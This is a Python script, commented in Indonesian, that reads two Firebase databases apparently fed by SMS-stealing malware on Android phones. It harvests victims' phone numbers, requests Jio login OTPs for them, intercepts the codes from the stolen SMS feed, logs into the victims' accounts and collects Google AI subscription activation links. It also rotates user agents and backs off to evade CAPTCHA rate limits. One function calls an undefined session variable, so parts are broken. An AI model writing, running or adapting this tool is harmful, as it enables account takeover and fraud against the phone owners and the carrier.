#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
===============================================================================
 JIO GEMINI PRO SCANNER  —  FIREXPANEL DUAL-PANEL EDITION
===============================================================================
 Panel target (dari link FirexPanel yang diberikan):
   PANEL 1 -> https://chunnu-25c16-default-rtdb.firebaseio.com    (alias: chunnu)
   PANEL 2 -> https://surakk-f709e-default-rtdb.firebaseio.com    (alias: surakk)

 Alur:
   1. Enumerasi device ONLINE di /clients dari kedua panel (filter status==true)
   2. Panen kandidat nomor HP dari 3 sumber sekaligus:
        a. /clients/{id}  -> field mobNo, sims[].phoneNumber, command.to, commands.to
        b. /devices/{id}  -> action.phoneNumber, to, dest, sendSms.*
        c. /messages/{id} -> simInfo.phoneNumber, phoneNumber, sender, body regex
   3. Validasi nomor = Jio (API jio-recharge-service)
   4. sendOtp -> poll Firebase /messages sampai OTP 6 digit masuk -> validateOtp
   5. Hit OTT flow (navigate -> activate -> google-ai -> submit) -> ambil
      https://serviceactivation.google.com/subscription/new/<token>
   6. Dedupe nomor global lintas panel, simpan CSV + TXT + JSONL

 Pemakaian:
   python jio_gemini_pro_dual.py                       # kedua panel, semua device
   python jio_gemini_pro_dual.py --panel 1             # panel chunnu saja
   python jio_gemini_pro_dual.py --panel 2             # panel surakk saja
   python jio_gemini_pro_dual.py --max-numbers 25      # batasi 25 nomor
   python jio_gemini_pro_dual.py --otp-timeout 45 --poll 1.5
   python jio_gemini_pro_dual.py --harvest-only        # cuma panen nomor (tanpa OTP)
   python jio_gemini_pro_dual.py --max-age-hours 72    # abaikan pesan lebih tua dari 72 jam

 Catatan panel1: /clients di panel chunnu hanya berisi battery/status/telegramChatId,
 jadi nomor diambil dari /messages + /devices (bukan dari /clients).
===============================================================================
"""

from __future__ import annotations

import argparse
import csv
import html
import json
import os
import random
import re
import string
import sys
import threading
import time
from collections import Counter, defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone, timedelta
from pathlib import Path
from typing import Any, Optional
from urllib.parse import unquote

import requests

if sys.stdout.encoding and sys.stdout.encoding.lower() not in {"utf-8", "utf8"}:
    try:
        sys.stdout.reconfigure(encoding="utf-8")
    except Exception:
        pass

BASE_DIR = Path(__file__).resolve().parent
RESULTS_FILE = BASE_DIR / "gemini_results.csv"
LINKS_FILE = BASE_DIR / "gemini_links.txt"
NUMBERS_FILE = BASE_DIR / "harvested_numbers.txt"
LOG_FILE = BASE_DIR / "scanner_log.jsonl"
STATE_FILE = BASE_DIR / "processed_numbers.json"

# ───────────────────────────── PANELS ───────────────────────────────────────
PANELS = [
    {"id": 1, "alias": "chunnu",
     "base_url": "https://chunnu-25c16-default-rtdb.firebaseio.com",
     "key": "", "rich_clients": False},
    {"id": 2, "alias": "surakk",
     "base_url": "https://surakk-f709e-default-rtdb.firebaseio.com",
     "key": "", "rich_clients": True},
]

# ───────────────────────────── JIO API ──────────────────────────────────────
J = "https://www.jio.com/api"
CHECK_NUMBER_URL = J + "/jio-recharge-service/recharge/mobility/number/{m}"
SEND_OTP_URL     = J + "/jio-login-service/login/sendOtp"
VERIFY_OTP_URL   = J + "/jio-login-service/login/validateOtp"
AUTH_URL         = J + "/jio-authenticate-service/authenticate/authJsonData"
NAVIGATE_URL     = J + "/jio-ott-service/ott/subscription/navigate/Z0241"
ACTIVATE_URL     = J + "/jio-ott-service/ott/subscription/activate/Z0241?source=JIO"
GOOGLE_URL       = J + "/jio-ott-service/ott/subscription/google-ai"
SUBMIT_URL       = J + "/jio-ott-service/ott/submission/submit"
GOOGLE_PAGE      = "https://www.jio.com/selfcare/googleai/?header=no&type=Z0241&source=JIO"

MOBILE_RE = re.compile(r"(?<!\d)(?:\+?91[\s-]?)?([6-9]\d{9})(?!\d)")
OTP_HINT_RE = re.compile(r"(?i)\botp\b|one[\s-]?time\s?password|verification code|login code")
OTP_RE = re.compile(r"(?<!\d)(\d{6})(?!\d)")
ACT_RE = re.compile(
    r"https?://serviceactivation[.]google[.]com/subscription/new/"
    r"(?P<tok>[A-Za-z0-9_\-]{40,})(?P<pad>={0,2})", re.I)

# nomor Jio ikut prefix 6-9; regex di atas sudah membatasi itu
SENDER_SKIP = re.compile(r"^[A-Z]{2}-|^[A-Z]{2}$")   # mis. JD-CAMIAL-S (bukan nomor)

CSV_FIELDS = ("no", "panel", "device_id", "number", "status", "link", "ts")


# ───────────────────────────── UTIL ─────────────────────────────────────────
def now_str() -> str:
    return datetime.now(timezone.utc).astimezone(
        timezone(timedelta(hours=5, minutes=30))).strftime("%Y-%m-%d %H:%M:%S")


def log_json(entry: dict) -> None:
    try:
        with LOG_FILE.open("a", encoding="utf-8") as f:
            f.write(json.dumps({"ts": now_str(), **entry}, ensure_ascii=False) + "\n")
    except Exception:
        pass


def norm(value: Any) -> Optional[str]:
    """Normalisasi ke 10 digit India valid (6-9xxxxxxxxx) atau None."""
    if value is None:
        return None
    d = re.sub(r"\D", "", str(value))
    if len(d) == 12 and d.startswith("91"):
        d = d[2:]
    elif len(d) == 11 and d.startswith("0"):
        d = d[1:]
    if len(d) == 10 and d[0] in "6789":
        return d
    return None


def deep_numbers(obj: Any, out: set, depth: int = 0) -> None:
    """Ambil semua nomor valid dari struktur JSON sedalam mungkin."""
    if depth > 6 or obj is None:
        return
    if isinstance(obj, dict):
        for k, v in obj.items():
            lk = str(k).lower()
            if isinstance(v, (str, int)) and any(
                    t in lk for t in ("phone", "mobile", "mobno", "number", "dest", "to", "sim")):
                n = norm(v)
                if n:
                    out.add(n)
            else:
                deep_numbers(v, out, depth + 1)
    elif isinstance(obj, list):
        for v in obj:
            deep_numbers(v, out, depth + 1)
    elif isinstance(obj, str):
        if 10 <= len(obj) <= 14 and re.fullmatch(r"[+\d\s-]{10,16}", obj.strip()):
            n = norm(obj)
            if n:
                out.add(n)


def harvest_from_messages(msgs: Any, out: set, max_age_h: int = 0) -> None:
    """Panen nomor dari /messages/{device}: simInfo, phoneNumber, sender, body."""
    if not isinstance(msgs, dict):
        return
    cutoff = (time.time() - max_age_h * 3600) if max_age_h > 0 else 0
    cutoff_ms = cutoff * 1000
    for key, item in msgs.items():
        if not isinstance(item, dict):
            continue
        if cutoff:
            try:
                ts = int(item.get("id") or item.get("timestamp") or key)
                if ts > 1e12:
                    pass  # ms epoch
                elif ts > 1e9:
                    ts *= 1000
                if ts and ts < cutoff_ms and ts > 1e12:
                    continue
            except Exception:
                pass
        si = item.get("simInfo")
        if isinstance(si, dict):
            n = norm(si.get("phoneNumber"))
            if n:
                out.add(n)
        for f in ("phoneNumber", "to", "dest", "number"):
            n = norm(item.get(f))
            if n:
                out.add(n)
        sender = str(item.get("sender") or "")
        if sender and not SENDER_SKIP.search(sender):
            n = norm(sender)
            if n:
                out.add(n)
        body = str(item.get("message") or "")
        if body:
            for m in MOBILE_RE.findall(body):
                n = norm(m)
                if n:
                    out.add(n)


def fb_session() -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "Accept": "application/json",
        "Cache-Control": "no-cache",
        "User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36",
    })
    return s


def jio_session() -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "User-Agent": f"Mozilla/5.0 (Linux; Android {random.choice([13,14,15])}; "
                      f"{random.choice(['SM-E135F','RMX3945','CPH2705','SM-A566E'])}) "
                      f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/1"
                      f"{random.randint(20,31)}.0.0.0 Mobile Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-IN,en;q=0.9",
        "Origin": "https://www.jio.com",
        "Referer": "https://www.jio.com/selfcare/login/",
        "sec-ch-ua-platform": '"Android"',
    })
    # Establish session cookies by visiting Jio homepage first
    try:
        s.get("https://www.jio.com/", timeout=15, allow_redirects=True)
    except Exception:
        pass
    try:
        s.get("https://www.jio.com/selfcare/login/", timeout=15, allow_redirects=True)
    except Exception:
        pass
    return s


class JioClient:
    """Rate-limited Jio API client. Jio hard-walls burst traffic with
    429 CAPTCHA_REQUIRED; a strict gap between requests plus exponential
    backoff + session rebuild keeps every call clean."""

    def __init__(self, min_gap: float = 4.0, max_tries: int = 5):
        self.min_gap = min_gap          # detik antar request
        self.max_tries = max_tries
        self.sess = jio_session()
        self._last = 0.0
        self._lock = threading.Lock()
        self.calls = 0

    def _throttle(self) -> None:
        with self._lock:
            wait = self.min_gap - (time.monotonic() - self._last)
            if wait > 0:
                time.sleep(wait)
            self._last = time.monotonic()

    def _rebuild(self) -> None:
        try:
            self.sess.close()
        except Exception:
            pass
        self.sess = jio_session()

    def req(self, method: str, url: str, **kw):
        for attempt in range(1, self.max_tries + 1):
            self._throttle()
            self.calls += 1
            r = jsafe(getattr(self.sess, method), url, **kw)
            if r is None:
                time.sleep(3 * attempt)
                continue
            body = r.text[:400].upper()
            if r.status_code == 429 or "CAPTCHA_REQUIRED" in body:
                if attempt == self.max_tries:
                    return r
                backoff = 15 * attempt
                print(f"      · captcha (try {attempt}/{self.max_tries}) — jeda {backoff}s")
                time.sleep(backoff)
                self._rebuild()
                continue
            return r
        return None

    def get(self, url: str, **kw):
        return self.req("get", url, **kw)

    def post(self, url: str, **kw):
        return self.req("post", url, **kw)



def fb_get(sess, base: str, key: str, path: str, params: dict | None = None,
           retries: int = 3) -> Any:
    q = {}
    if key:
        q["auth"] = key
    if params:
        q.update(params)
    last = None
    for attempt in range(retries):
        try:
            r = sess.get(f"{base}/{path.strip('/')}.json", params=q, timeout=25)
            if r.status_code == 401:
                return {"__auth__": True}
            r.raise_for_status()
            return r.json()
        except Exception as e:
            last = e
            time.sleep(0.7 * (attempt + 1))
    raise last if last else RuntimeError("fb_get failed")


def jsafe(fn, *a, **kw):
    try:
        return fn(*a, **kw)
    except requests.RequestException:
        return None


def rjson(r) -> dict:
    if r is None:
        return {}
    try:
        d = r.json()
        return d if isinstance(d, dict) else {}
    except ValueError:
        return {}


def rerr(r) -> bool:
    if r is None or not r.ok:
        return True
    d = rjson(r)
    if d.get("errorMessage") or d.get("error"):
        return True
    return str(d.get("status", "")).lower() in {"failed", "failure", "error", "false"}


def api_msg(d: dict) -> str:
    for k in ("errorMessage", "responseMessage", "responseMsg", "message"):
        if d.get(k):
            return str(d[k])
    return ""


# ───────────────────────────── JIO OPS ──────────────────────────────────────
def is_jio(client: JioClient, num: str) -> tuple[bool, str]:
    """Validate Jio via /sendOtp. Returns (is_jio, masked_value_or_reason)."""
    r = client.post(
        SEND_OTP_URL,
        json={"mobileNumber": num, "loginFlowType": "MOBILE", "alternateNumber": ""},
        headers={"Accept": "application/json", "Content-Type": "application/json"},
        timeout=30,
    )
    if r is None:
        return False, "net_error"
    if r.status_code == 429:
        return False, "captcha"
    try:
        d = r.json()
    except ValueError:
        return False, "bad_json"
    if str(d.get("responseCode", "")) == "200" or d.get("responseMessage") == "SUCCESS":
        return True, d.get("maskedValue", "")
    err = str(d.get("errorMessage", "") + d.get("errorCode", "")).lower()
    if "invalid" in err and "jionumber" in err:
        return False, "not_jio"
    if "captcha" in err:
        return False, "captcha"
    # Fallback to old endpoint
    r2 = client.get(CHECK_NUMBER_URL.format(m=num), timeout=25)
    if r2 is not None and r2.ok:
        try:
            d2 = r2.json()
            if d2.get("primaryService"):
                return True, d2.get("partyId", "")
        except Exception:
            pass
    return False, f"unknown_{r.status_code}"


def send_otp(client: JioClient, num: str) -> tuple[bool, str]:
    r = client.post(SEND_OTP_URL,
              json={"mobileNumber": num, "loginFlowType": "MOBILE", "alternateNumber": ""},
              headers={"Accept": "application/json", "Content-Type": "application/json"},
              timeout=30)
    if r is None:
        return False, "net_error"
    try:
        d = r.json()
    except ValueError:
        return False, "bad_json"
    msg = api_msg(d)
    if rerr(r):
        return False, msg or f"http_{r.status_code}"
    return True, d.get("maskedValue", "")


def verify_otp(client: JioClient, num: str, otp: str) -> bool:
    r = client.post(VERIFY_OTP_URL, json={"mobileNumber": num, "otp": otp}, timeout=30)
    if r is None or rerr(r):
        return False
    try:
        d = r.json()
    except ValueError:
        return False
    # loginFlag true = sukses; cookie sesi ter-set
    if str(d.get("loginFlag", "")).lower() == "true":
        return True
    return bool(r.cookies.get_dict())


def msg_rank(key: str, item: dict) -> int:
    for v in (item.get("id"), item.get("timestamp"), key):
        try:
            return int(v)
        except (TypeError, ValueError):
            continue
    return 0


def poll_otp(fbsess, base, key, dev_id, known: set, client: JioClient, num,
             timeout: int, interval: float) -> Optional[str]:
    """Poll Firebase messages sampai OTP baru masuk lalu verifikasi."""
    deadline = time.monotonic() + timeout
    tried: set = set()
    while time.monotonic() < deadline:
        try:
            msgs = fb_get(fbsess, base, key, f"messages/{dev_id}",
                          {"orderBy": '"$key"', "limitToLast": 25}, retries=2)
        except Exception:
            time.sleep(interval)
            continue
        if not isinstance(msgs, dict):
            time.sleep(interval)
            continue
        cand = []
        for k, it in msgs.items():
            if k in known or k in tried or not isinstance(it, dict):
                continue
            body = str(it.get("message") or "")
            if not (OTP_HINT_RE.search(body) or "OTP" in body.upper()):
                continue
            m = OTP_RE.search(body)
            if not m:
                continue
            # OTP Jio biasanya 4-6 digit; utamakan 6
            cand.append((msg_rank(k, it), k, m.group(1), body[:80]))
        if cand:
            cand.sort(reverse=True)
            for _, k, otp, body in cand:
                tried.add(k)
                if verify_otp(jiosess, num, otp):
                    return otp
                # coba varian 4 digit bila 6 digit dari pesan bank dsb
                m4 = re.search(r"(?<!\d)(\d{4,8})(?!\d)", body)
                if m4 and m4.group(1) != otp:
                    if verify_otp(jiosess, num, m4.group(1)):
                        return m4.group(1)
        time.sleep(interval)
    return None


def parse_act_url(raw: str) -> str:
    t = html.unescape(raw or "")
    for _ in range(5):
        d = unquote(t)
        if d == t:
            break
        t = d
    m = ACT_RE.search(t)
    if not m:
        return ""
    return ("https://serviceactivation.google.com/subscription/new/"
            + m.group("tok") + (m.group("pad") or ""))


def already_active(txt: str) -> bool:
    n = " ".join((txt or "").lower().replace("_", " ").split())
    return any(p in n for p in (
        "already active", "already activated", "already redeemed", "already claimed",
        "already availed", "already in use", "subscription already",
        "already used", "link has already"))


def ott_flow(client: JioClient) -> tuple[str, str]:
    """navigate -> activate -> google-ai -> submit. Return (status, link)."""
    dash = {"Accept": "*/*", "Referer": "https://www.jio.com/selfcare/dashboard/"}
    off = {"Accept": "*/*", "Referer": GOOGLE_PAGE}

    a = client.get(AUTH_URL, headers=dash, timeout=25)
    if a is None or not a.ok:
        return "auth_http_fail", ""
    try:
        ad = a.json()
    except ValueError:
        return "bad_auth_json", ""
    if str(ad.get("loginFlag", "")).lower() != "true":
        return "session_invalid", ""

    client.get(NAVIGATE_URL, headers=dash, timeout=25)

    act = client.get(ACTIVATE_URL, headers=off, timeout=25)
    if act is None:
        return "activate_net_fail", ""
    try:
        ad2 = act.json()
    except ValueError:
        ad2 = {}
    if already_active(api_msg(ad2)):
        return "already_active", ""
    if not act.ok:
        return f"activate_http_{act.status_code}", ""

    g = client.get(GOOGLE_URL, headers=off, timeout=25)
    if g is None:
        return "google_net_fail", ""
    try:
        gd = g.json()
    except ValueError:
        return "bad_google_json", ""
    if already_active(api_msg(gd)):
        return "already_active", ""

    url = parse_act_url(str(gd.get("redirectionURL") or ""))
    if not url:
        for f in ("url", "activationUrl", "link", "deepLink"):
            url = parse_act_url(str(gd.get(f) or ""))
            if url:
                break
    if not url:
        return "no_link", api_msg(gd)[:90]

    client.get(SUBMIT_URL, headers=off, timeout=25)
    return "link_found", url


# ───────────────────────────── PERSISTENCE ──────────────────────────────────
def load_state() -> set:
    if STATE_FILE.exists():
        try:
            return set(json.loads(STATE_FILE.read_text(encoding="utf-8")))
        except Exception:
            return set()
    return set()


def save_state(state: set) -> None:
    try:
        STATE_FILE.write_text(json.dumps(sorted(state)), encoding="utf-8")
    except Exception:
        pass


def append_link(url: str) -> None:
    if not url:
        return
    seen = set(LINKS_FILE.read_text(encoding="utf-8").splitlines()) if LINKS_FILE.exists() else set()
    if url in seen:
        return
    with LINKS_FILE.open("a", encoding="utf-8") as f:
        f.write(url + "\n")


def append_csv(row: dict) -> None:
    exists = RESULTS_FILE.exists() and RESULTS_FILE.stat().st_size > 0
    with RESULTS_FILE.open("a", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=CSV_FIELDS)
        if not exists:
            w.writeheader()
        w.writerow(row)


# ───────────────────────────── HARVEST ──────────────────────────────────────
def scan_panel(panel: dict, msg_limit: int, max_age_h: int, workers: int):
    """Return (panel, {device_id: {nums, base, key, sess, data}}, stats)."""
    base, key = panel["base_url"], panel["key"]
    sess = fb_session()
    stats = {"panel": panel, "clients": 0, "online": 0, "devices": 0, "error": ""}
    print(f"\n{'='*74}\n[PANEL {panel['id']}: {panel['alias']}] {base}\n{'='*74}")

    try:
        clients = fb_get(sess, base, key, "clients")
    except Exception as e:
        stats["error"] = f"clients fetch: {e}"
        print(f"  ! {stats['error']}")
        return panel, {}, stats

    if isinstance(clients, dict) and clients.get("__auth__"):
        stats["error"] = "401 butuh auth key"
        print(f"  ! {stats['error']}")
        return panel, {}, stats

    if not isinstance(clients, dict):
        stats["error"] = "clients bukan objek"
        print(f"  ! {stats['error']}")
        return panel, {}, stats

    stats["clients"] = len(clients)
    online = [d for d, v in clients.items() if isinstance(v, dict) and v.get("status") is True]
    stats["online"] = len(online)
    print(f"  clients={len(clients)}  online={len(online)}")

    if not online:
        return panel, {}, stats

    # /devices untuk cross-reference (panel1 kaya di sini)
    try:
        devices = fb_get(sess, base, key, "devices") or {}
    except Exception:
        devices = {}
    if isinstance(devices, dict) and devices.get("__auth__"):
        devices = {}
    stats["devices"] = len(devices) if isinstance(devices, dict) else 0

    results: dict = {}
    lock = threading.Lock()

    def work(dev_id: str) -> None:
        nums: set = set()
        cdata = clients.get(dev_id) or {}
        deep_numbers(cdata, nums)                     # sims[], mobNo, command.to
        ddata = (devices.get(dev_id) if isinstance(devices, dict) else None) or {}
        deep_numbers(ddata, nums)                     # action.phoneNumber, dest
        try:
            msgs = fb_get(sess, base, key, f"messages/{dev_id}",
                          {"orderBy": '"$key"', "limitToLast": max(1, msg_limit)},
                          retries=2)
        except Exception:
            msgs = {}
        harvest_from_messages(msgs, nums, max_age_h)

        with lock:
            results[dev_id] = {
                "nums": nums, "base": base, "key": key, "sess": sess,
                "data": cdata, "panel": panel["alias"], "panel_id": panel["id"],
            }
            print(f"  · {dev_id}  {'/'.join(sorted(nums)) or '-'}")

    with ThreadPoolExecutor(max_workers=workers) as ex:
        list(ex.map(work, online))

    return panel, results, stats


# ───────────────────────────── MAIN ─────────────────────────────────────────
def main() -> int:
    ap = argparse.ArgumentParser(
        description="Jio Gemini Pro scanner — FirexPanel dual-panel edition")
    ap.add_argument("--panel", type=int, choices=[0, 1, 2], default=0,
                    help="0=semua, 1=chunnu, 2=surakk")
    ap.add_argument("--message-limit", type=int, default=200, help="pesan/device (default 200)")
    ap.add_argument("--max-age-hours", type=int, default=0,
                    help="0=semua pesan; >0 hanya pesan lebih baru dari N jam")
    ap.add_argument("--otp-timeout", type=int, default=45, help="detik tunggu OTP")
    ap.add_argument("--poll", type=float, default=1.0, help="interval poll OTP (detik)")
    ap.add_argument("--otp-retry", type=int, default=2, help="ulang sendOtp bila OTP tak masuk")
    ap.add_argument("--threads", type=int, default=8, help="thread panen")
    ap.add_argument("--max-numbers", type=int, default=0, help="0=semua nomor")
    ap.add_argument("--harvest-only", action="store_true", help="hanya panen nomor")
    ap.add_argument("--skip-processed", action="store_true", default=True)
    ap.add_argument("--no-skip", dest="skip_processed", action="store_false")
    ap.add_argument("--shuffle", action="store_true", help="acak urutan nomor")
    args = ap.parse_args()

    panels = [p for p in PANELS if args.panel in (0, p["id"])]

    print("=" * 74)
    print(" JIO GEMINI PRO SCANNER — FIREXPANEL DUAL-PANEL")
    print("=" * 74)
    for p in panels:
        print(f"  panel{p['id']} [{p['alias']}] -> {p['base_url']}")
    print(f"  msg/device={args.message_limit} age={args.max_age_hours or 'any'}h "
          f"otp_timeout={args.otp_timeout}s threads={args.threads}")
    print("=" * 74)

    # ── STEP 1+2: panen ────────────────────────────────────────────────
    device_map: dict = {}
    pool: dict[str, set] = defaultdict(set)   # num -> device_ids
    online_total = 0

    for p in panels:
        _, devs, st = scan_panel(p, args.message_limit, args.max_age_hours, args.threads)
        online_total += st["online"]
        for dev_id, info in devs.items():
            device_map[dev_id] = info
            for n in info["nums"]:
                pool[n].add(dev_id)

    print(f"\n{'='*74}")
    print(f" Device online (total): {online_total}")
    print(f" Nomor unik: {len(pool)}")

    if not pool:
        print(" Tidak ada nomor. Selesai.")
        return 1

    # simpan hasil panen
    with NUMBERS_FILE.open("w", encoding="utf-8") as f:
        for n in sorted(pool):
            f.write(n + "\n")
    print(f" Harvest -> {NUMBERS_FILE}")

    if args.harvest_only:
        print("\n--harvest-only: berhenti di sini.")
        return 0

    # target: satu device per nomor (prioritas device yang panel-nya kaya data)
    ranked = []
    for n, devs in pool.items():
        d = sorted(devs, key=lambda x: (0 if device_map.get(x, {}).get("panel_id") == 2 else 1, x))[0]
        ranked.append((d, n))
    if args.shuffle:
        random.shuffle(ranked)

    state = load_state()
    if args.skip_processed:
        before = len(ranked)
        ranked = [(d, n) for d, n in ranked if n not in state]
        if before != len(ranked):
            print(f" Skip {before - len(ranked)} nomor yang sudah diproses")

    if args.max_numbers:
        ranked = ranked[:args.max_numbers]

    print(f" Target diproses: {len(ranked)}\n{'='*74}")

    # ── STEP 3: OTP + aktivasi ─────────────────────────────────────────
    jioc = JioClient(min_gap=5.0, max_tries=3)
    counter: Counter = Counter()
    serial = 0

    try:
        for dev_id, num in ranked:
            info = device_map[dev_id]
            base, key, fbsess = info["base"], info["key"], info["sess"]
            serial += 1
            head = f"[{serial}/{len(ranked)}] {info['panel']}#{info['panel_id']} {dev_id} …{num[-4:]}"
            print(f"\n{head}")

            status, link = "?", ""

            if (info["data"] or {}).get("status") is not True:
                status = "device_offline"
                print("   device_offline")
            else:
                ok, detail = is_jio(jioc, num)
                if not ok:
                    status = f"not_jio:{detail}"
                    print(f"   bukan Jio ({detail})")
                else:
                    print(f"   Jio OK (partyId={detail})")

                    known = set()
                    try:
                        prev = fb_get(fbsess, base, key, f"messages/{dev_id}",
                                      {"orderBy": '"$key"', "limitToLast": 200}, retries=2)
                        if isinstance(prev, dict):
                            known = set(prev)
                    except Exception:
                        pass

                    otp = None
                    for attempt in range(1, args.otp_retry + 2):
                        sent, sm = send_otp(jioc, num)
                        if not sent:
                            status = f"otp_send_fail:{sm[:40]}"
                            print(f"   sendOtp gagal ({sm[:50]})")
                            break
                        print(f"   OTP terkirim -> {sm} (tunggu {args.otp_timeout}s)")
                        otp = poll_otp(fbsess, base, key, dev_id, known, jioc, num,
                                       args.otp_timeout, args.poll)
                        if otp:
                            break
                        if attempt <= args.otp_retry:
                            print(f"   OTP timeout, ulang kirim ({attempt}/{args.otp_retry})")

                    if status == "?":
                        if not otp:
                            status = "otp_timeout"
                            print("   OTP tidak masuk")
                        else:
                            print(f"   OTP valid: {otp} — ambil link")
                            status, link = ott_flow(jioc)
                            if link:
                                print(f"   >>> {link}")
                            else:
                                print(f"   {status}")

            counter[status.split(":")[0]] += 1
            append_link(link)
            append_csv({
                "no": serial, "panel": info["panel"], "device_id": dev_id,
                "number": num, "status": status, "link": link, "ts": now_str(),
            })
            log_json({"type": "result", "device": dev_id, "number": num,
                      "status": status, "link": link})

        # jeda kecil cegah rate-limit Jio
            if serial % 10 == 0:
                time.sleep(2)

    except KeyboardInterrupt:
        print("\n\n  Interrupted — simpan state & ringkasan.")

    state |= {n for _, n in ranked}
    save_state(state)

    print(f"\n{'='*74}\n RINGKASAN\n{'='*74}")
    print(f" online={online_total} nomor={len(pool)} diproses={serial}")
    for st, c in counter.most_common():
        print(f"   {st:24} {c}")
    found = LINKS_FILE.read_text(encoding="utf-8").split() if LINKS_FILE.exists() else []
    print(f" LINK TOTAL: {len(found)}")
    if found:
        print("\n link baru (5 terakhir):")
        for l in found[-5:]:
            print("   " + l)
    print(f"\n file: {RESULTS_FILE.name} | {LINKS_FILE.name} | {NUMBERS_FILE.name}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
